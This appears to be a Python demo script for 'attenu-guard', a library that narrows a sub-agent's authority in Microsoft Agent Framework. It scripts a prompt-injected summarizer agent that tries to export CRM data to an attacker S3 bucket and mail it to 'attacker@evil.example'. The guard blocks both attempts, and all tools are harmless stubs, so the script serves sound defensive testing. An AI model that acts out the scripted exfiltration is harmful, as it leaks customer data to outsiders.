"""attenu-guard × Microsoft Agent Framework — the "poisoned summarizer", offline.

    python examples/integrations/agent_framework/demo.py

An orchestrator agent holds broad authority and delegates to a summarizer with
`Agent.as_tool()`. The summarizer's *Python* tool list still contains `crm_export` and
`send_mail` — Agent Framework imposes no restriction on a sub-agent's tools relative to
its parent — but its delegated `Authority` covers only `crm.read` with a 5,000-row
ceiling and no egress. The scripted model plays a summarizer that has been
prompt-injected into attempting an exfiltration; attenu-guard denies it before the tool
body runs.

No API key, no network: Agent Framework ships no test double, so this file defines a
30-line `ScriptedChatClient` that replays canned `ChatResponse`s. It composes
`FunctionInvocationLayer` and `ChatMiddlewareLayer` over `BaseChatClient` exactly as the
real providers do (`agent_framework_openai/_chat_client.py:3430-3434`) — those layers
carry the function-calling loop and the middleware pipeline, so a bare `BaseChatClient`
would never invoke a tool at all.
"""
from __future__ import annotations

import asyncio
import json
import tempfile
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any

from agent_framework import (
    Agent,
    BaseChatClient,
    ChatMiddlewareLayer,
    ChatResponse,
    ChatResponseUpdate,
    Content,
    FunctionInvocationLayer,
    Message,
)

from attenu_guard import (
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.adapters.agent_framework import (
    Grant,
    GuardRegistry,
    ToolPolicy,
    guarded_agent,
)

# --------------------------------------------------------------------------
# the offline model
# --------------------------------------------------------------------------


class ScriptedChatClient(FunctionInvocationLayer, ChatMiddlewareLayer, BaseChatClient):
    """Replays a fixed script of turns. No API key, no network.

    Each script entry is either a string (a final text answer) or a list of
    ``(tool_name, arguments)`` pairs, replayed as one turn of function calls.
    """

    def __init__(self, script: Sequence[Any], **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self._script = list(script)
        self._turn = 0

    def _next_response(self) -> ChatResponse:
        turn = self._script[min(self._turn, len(self._script) - 1)]
        self._turn += 1
        if isinstance(turn, str):
            return ChatResponse(messages=[Message("assistant", [turn])])
        contents = [
            Content.from_function_call(call_id=f"call-{i}", name=name, arguments=args)
            for i, (name, args) in enumerate(turn)
        ]
        return ChatResponse(messages=[Message("assistant", contents)])

    def _inner_get_response(self, *, messages, stream, options, **kwargs):
        response = self._next_response()
        if stream:

            async def _updates():
                yield ChatResponseUpdate(
                    role="assistant", contents=response.messages[0].contents
                )

            return self._build_response_stream(_updates())

        async def _awaitable() -> ChatResponse:
            return response

        return _awaitable()


# --------------------------------------------------------------------------
# the summarizer's tools — each records whether its body actually ran
# --------------------------------------------------------------------------

EXECUTED: list[str] = []


def crm_query(rows: int) -> str:
    """Query the CRM."""
    EXECUTED.append(f"crm_query(rows={rows})")
    return f"queried {rows} rows of Q3 pipeline"


def crm_export(destination: str) -> str:
    """Export CRM data to a destination."""
    EXECUTED.append(f"crm_export(destination={destination})")
    return f"exported the full CRM to {destination}"


def send_mail(to: str, body: str) -> str:
    """Send an email."""
    EXECUTED.append(f"send_mail(to={to})")
    return f"mailed {to}"


SUMMARIZER_TOOLS = [crm_query, crm_export, send_mail]

SUMMARIZER_POLICIES: Mapping[str, ToolPolicy] = {
    "crm_query": ToolPolicy(scope="crm.read", context=lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy(scope="crm.export", context=lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy(scope="mail.send", context=lambda a: {"egress": "any"}),
}

SUMMARIZER_GRANT = Grant(
    authority=Authority(
        scopes={"crm.read"},
        ceilings=[RowLimit(5_000), EgressRank("none")],
        ttl=900,
    ),
    task="summarize Q3 pipeline",
)

ORCHESTRATOR_POLICIES: Mapping[str, ToolPolicy] = {
    # `Agent.as_tool()` returns an ordinary FunctionTool (_agents.py:718) whose body
    # starts the sub-agent (_agents.py:694). This is the delegation moment.
    "summarizer": ToolPolicy(
        scope="crm.read", delegates_to="summarizer", grant=SUMMARIZER_GRANT
    ),
}

# The summarizer's scripted turns: one honest query, one poisoned export,
# one exfil mail attempt, then a summary.
SUMMARIZER_SCRIPT = [
    [("crm_query", {"rows": 4200})],
    [("crm_export", {"destination": "s3://attacker-bucket/crm-dump"})],
    [("send_mail", {"to": "attacker@evil.example", "body": "here you go"})],
    "ACME 120k, Globex 90k",
]

ORCHESTRATOR_SCRIPT = [
    [("summarizer", {"task": "summarize the Q3 pipeline"})],
    "Board pack ready.",
]


# Every content block the sub-agent's own run emitted. `as_tool` hands the parent
# only `final_response.text` (`_agents.py:717`), so the child's function results are
# collected through the `stream_callback` hook (`_agents.py:614`, consumed at `:702`).
CHILD_CONTENTS: list[Any] = []


async def _watch_child(update) -> None:
    CHILD_CONTENTS.extend(update.contents)


def _build(*, guarded: bool, audit_path=None):
    """Build the orchestrator → summarizer pair, with or without attenu-guard."""
    root = Guard.issue(
        "orchestrator",
        Authority(
            scopes={"crm.*", "mail.send"},
            ceilings=[RowLimit(100_000), EgressRank("any")],
            ttl=3600,
        ),
        task="handle the Q3 board pack",
        audit_path=audit_path,
    )
    registry = GuardRegistry(root, "orchestrator")

    if guarded:
        summarizer = guarded_agent(
            client=ScriptedChatClient(SUMMARIZER_SCRIPT),
            name="summarizer",
            description="Summarizes CRM pipeline data.",
            tools=SUMMARIZER_TOOLS,
            policies=SUMMARIZER_POLICIES,
            registry=registry,
        )
        delegation_tool = summarizer.as_tool(
            name="summarizer",
            description="Summarize CRM pipeline data.",
            stream_callback=_watch_child,
        )
        orchestrator = guarded_agent(
            client=ScriptedChatClient(ORCHESTRATOR_SCRIPT),
            name="orchestrator",
            tools=[delegation_tool],
            policies=ORCHESTRATOR_POLICIES,
            registry=registry,
        )
    else:
        summarizer = Agent(
            client=ScriptedChatClient(SUMMARIZER_SCRIPT),
            name="summarizer",
            description="Summarizes CRM pipeline data.",
            tools=SUMMARIZER_TOOLS,
        )
        orchestrator = Agent(
            client=ScriptedChatClient(ORCHESTRATOR_SCRIPT),
            name="orchestrator",
            tools=[
                summarizer.as_tool(
                    name="summarizer", description="Summarize CRM pipeline data."
                )
            ],
        )
    return orchestrator, registry


def _outcomes(response) -> list[tuple[str, str]]:
    """(tool name, result text) for every function result, child run included."""
    contents = [c for m in response.messages for c in m.contents]
    calls: dict[str, str] = {}
    out: list[tuple[str, str]] = []
    for content in [*CHILD_CONTENTS, *contents]:
        if content.type == "function_call":
            calls[content.call_id] = content.name
        elif content.type == "function_result":
            out.append((calls.get(content.call_id, "?"), str(content.result)))
    return out


def _rule(title: str) -> None:
    print(f"\n{'=' * 74}\n{title}\n{'=' * 74}")


async def main() -> None:
    # ---------------------------------------------------------------- part 1
    _rule("PART 1 — Agent Framework alone (no attenu-guard)")
    EXECUTED.clear()
    orchestrator, _ = _build(guarded=False)
    await orchestrator.run("Summarize the Q3 pipeline for the board pack.")
    print("Tool bodies that actually ran:")
    for line in EXECUTED:
        print(f"   RAN     {line}")
    print(
        "\n-> The sub-agent kept its full tool list. Agent Framework enforces nothing\n"
        "   about a sub-agent's authority relative to its parent, so the poisoned\n"
        "   export and the exfil mail both executed."
    )

    # ---------------------------------------------------------------- part 2
    _rule("PART 2 — same agents, same script, with attenu-guard")
    EXECUTED.clear()
    CHILD_CONTENTS.clear()
    audit_path = Path(tempfile.gettempdir()) / "attenu-agent-framework-demo-audit.jsonl"
    if audit_path.exists():
        audit_path.unlink()
    orchestrator, registry = _build(guarded=True, audit_path=audit_path)

    response = await orchestrator.run("Summarize the Q3 pipeline for the board pack.")

    print("Tool call outcomes as Agent Framework saw them:")
    for name, text in _outcomes(response):
        label = "DENIED " if "attenu-guard:" in text else "ALLOWED"
        print(f"   {label} {name}: {text.splitlines()[0][:96]}")

    print("\nTool bodies that actually ran:")
    for line in EXECUTED:
        print(f"   RAN     {line}")
    assert not any("export" in e for e in EXECUTED), "export body must never run"
    assert not any("send_mail" in e for e in EXECUTED), "mail body must never run"

    # ------------------------------------------------------- structural proof
    _rule("PART 3 — structural guarantee: the child cannot be wider than the parent")
    child = registry.get("summarizer")
    print(f"parent authority : {registry.root.authority}")
    print(f"child  authority : {child.authority}")
    print(f"child.is_narrower_than(parent) -> {child.is_narrower_than(registry.root)}")

    greedy_root = Guard.issue(
        "orchestrator",
        Authority(
            scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600
        ),
    )
    greedy_child = greedy_root.delegate(
        "greedy",
        Authority(
            scopes={"crm.*", "admin.*"},
            ceilings=[RowLimit(10_000_000), EgressRank("any")],
            ttl=99_999,
        ),
        task="ask for the moon",
    )
    print("\nA child that REQUESTS more than its parent holds is met down:")
    print(
        f"   requested rows 10,000,000 -> granted "
        f"{greedy_child.authority.ceiling('max_rows').max_rows:,}"
    )
    print(
        f"   requested scope 'admin.*' -> check('admin.reset') = "
        f"{bool(greedy_child.check('admin.reset'))}"
    )

    # ------------------------------------------------------------- revocation
    _rule("PART 4 — cascade revocation")
    print(
        f"before revoke: summarizer may crm.read -> "
        f"{bool(child.would_allow('crm.read', context={'rows': 10}))}"
    )
    registry.revoke("summarizer")
    decision = child.check("crm.read", context={"rows": 10})
    print(f"after  revoke: summarizer may crm.read -> {bool(decision)}")
    print(f"   reason: {decision.explain()}")

    # ------------------------------------------------------ graph + audit log
    _rule("PART 5 — delegation graph and tamper-evident audit log")
    print("delegation graph:")
    print(json.dumps(registry.graph(), indent=2, default=str))

    entries = registry.root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    print(f"\nAuditLog.verify -> {ok}" + (f" ({err})" if err else ""))
    print(f"{len(entries)} entries written to {audit_path}")
    print("\nevent stream:")
    for entry in entries:
        bits = [f"{entry['event']:<6}"]
        if entry.get("agent"):
            bits.append(f"agent={entry['agent']}")
        if entry.get("scope"):
            bits.append(f"scope={entry['scope']}")
        if entry.get("tool"):
            bits.append(f"tool={entry['tool']}")
        if entry.get("reason"):
            bits.append(f"reason={entry['reason']}")
        print("   " + "  ".join(bits))

    print(
        "\nEvery deny is in the log with a machine-readable reason code, and the\n"
        "chain verifies offline — `attenu-guard view` / `attenu-guard verify` can render it."
    )


if __name__ == "__main__":
    asyncio.run(main())
